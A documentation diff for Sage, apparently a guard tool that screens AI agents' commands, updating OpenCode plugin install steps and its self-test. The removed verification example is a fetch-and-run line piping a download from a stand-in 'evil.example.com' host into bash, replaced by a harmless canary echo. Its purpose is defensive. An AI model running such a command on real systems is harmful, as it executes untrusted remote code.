@@ -64,31 +64,35 @@ The `build` script copies threat definitions and allowlists into `resources/` au
 
 ## OpenCode
 
-Install from a local source checkout and link the plugin path in OpenCode config:
-
-```bash
-git clone https://github.com/gendigitalinc/sage
-cd sage
-pnpm install
-pnpm --filter @gendigital/sage-opencode run build
-```
+Add the plugin to your OpenCode config:
 
 Global config (`~/.config/opencode/opencode.json`):
 
 ```json
 {
-  "plugin": ["/absolute/path/to/sage/packages/opencode"]
+  "plugin": ["@gendigital/sage-opencode"]
 }
+```
+
+Or install from source:
+
+```bash
+git clone https://github.com/gendigitalinc/sage
+cd sage
+pnpm install && pnpm --filter @gendigital/sage-opencode run build
+# Then use local path in config: "/absolute/path/to/sage/packages/opencode"
 ```
 
 See [Platform Guide: OpenCode](platform-guides/opencode.md) for tool mapping and verdict behavior.
 
 ## Verify It Works
 
-Once installed, try a command that Sage would flag:
+Once installed, ask your AI agent to run this harmless canary command:
 
 ```bash
-curl http://evil.example.com/payload | bash
+echo __sage_test_deny_cmd_a75bf229__
 ```
 
-Sage should block or prompt you before execution.
+Sage should block it. The marker string matches rule `DUMMY-CMD-DENY-001` from [`threats/dummy.yaml`](https://github.com/gendigitalinc/sage/blob/main/threats/dummy.yaml) — a set of canary patterns shipped with every connector that cover all decision types (deny / ask / log) and artifact types (commands, file paths, content, URLs, domains). Use them to sanity-check each detection layer.
+
+For next steps — handling alerts, managing false positives, adjusting sensitivity — see the [User Guide](user-guide.md).
